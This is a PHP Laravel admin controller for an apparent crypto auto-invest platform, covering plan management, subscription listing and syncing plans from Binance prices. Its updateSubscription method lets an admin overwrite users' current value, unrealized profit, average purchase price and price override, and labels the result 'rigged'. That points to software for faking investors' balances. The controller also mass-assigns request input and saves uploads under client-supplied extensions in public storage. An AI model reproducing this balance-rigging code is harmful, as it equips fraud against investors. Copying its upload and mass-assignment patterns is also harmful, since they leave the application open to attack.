<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\DcaPlan;
use App\Models\DcaSubscription;
use App\Services\BinancePriceService;
use Illuminate\Http\Request;

class DcaController extends Controller
{
    public function index()
    {
        $plans = DcaPlan::withCount('dcaSubscriptions')->orderBy('id', 'desc')->get();

        return view('admin.dca_plans', compact('plans'));
    }

    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'asset' => 'required|string',
            'frequency' => 'required|in:daily,weekly,biweekly,monthly',
            'min_amount' => 'required|numeric',
            'max_amount' => 'required|numeric',
            'spread_markup' => 'required|numeric',
            'execution_hour' => 'required|integer|min:0|max:23',
        ]);

        $data = $request->except('_token');
        $data['status'] = 'active';
        $data['buffer_percent'] = $request->buffer_percent ?? 20.00;
        $data['per_withdrawal_percent'] = $request->per_withdrawal_percent ?? 5.00;

        if ($request->hasFile('image')) {
            $filename = $request->file('image');
            $newfilename = time().'.'.$filename->getClientOriginalExtension();
            $request->file('image')->storeAs('image', $newfilename, 'public');
            $data['image'] = $newfilename;
        }

        DcaPlan::create($data);

        return back()->with('status', 'DCA Plan created successfully.');
    }

    public function update(Request $request)
    {
        $plan = DcaPlan::findOrFail($request->id);

        $data = $request->except('_token');
        if (! isset($data['buffer_percent'])) {
            $data['buffer_percent'] = 20.00;
        }
        if (! isset($data['per_withdrawal_percent'])) {
            $data['per_withdrawal_percent'] = 5.00;
        }

        if ($request->hasFile('image')) {
            $filename = $request->file('image');
            $newfilename = time().'.'.$filename->getClientOriginalExtension();
            $request->file('image')->storeAs('image', $newfilename, 'public');
            $data['image'] = $newfilename;
        }

        $plan->update($data);

        return back()->with('status', 'DCA Plan updated successfully.');
    }

    public function destroy($id)
    {
        DcaPlan::findOrFail($id)->delete();

        return back()->with('status', 'DCA Plan deleted.');
    }

    public function subscriptions()
    {
        $subscriptions = DcaSubscription::with(['user', 'plan'])->orderBy('id', 'desc')->paginate(20);

        return view('admin.dca_subscriptions', compact('subscriptions'));
    }

    public function updateSubscription(Request $request)
    {
        $sub = DcaSubscription::findOrFail($request->id);

        $data = $request->only([
            'admin_price_override',
            'admin_status',
            'current_value',
            'unrealized_pnl',
            'avg_purchase_price',
        ]);

        $sub->update($data);

        return back()->with('status', 'Subscription rigged/updated successfully.');
    }

    public function syncFromBinance(BinancePriceService $binanceService)
    {
        $assets = ['BTC', 'ETH', 'BNB', 'SOL', 'XRP', 'ADA', 'DOGE', 'MATIC', 'DOT', 'LINK'];
        $priceMap = $binanceService::getPriceMap() ?? [];
        $count = 0;

        foreach ($assets as $symbol) {
            $binanceSymbol = $symbol.'USDT';
            if (array_key_exists($binanceSymbol, $priceMap)) {
                $exists = DcaPlan::where('asset', $symbol)->exists();
                if (! $exists) {
                    DcaPlan::create([
                        'name' => "$symbol Auto-Invest",
                        'asset' => $symbol,
                        'frequency' => 'daily',
                        'min_amount' => 10,
                        'max_amount' => 100000,
                        'spread_markup' => 1.5,
                        'execution_hour' => 12,
                        'status' => 'active',
                        'buffer_percent' => 20,
                        'per_withdrawal_percent' => 5,
                    ]);
                    $count++;
                }
            }
        }

        return back()->with('status', "Auto-populated $count DCA plans from Binance.");
    }
}
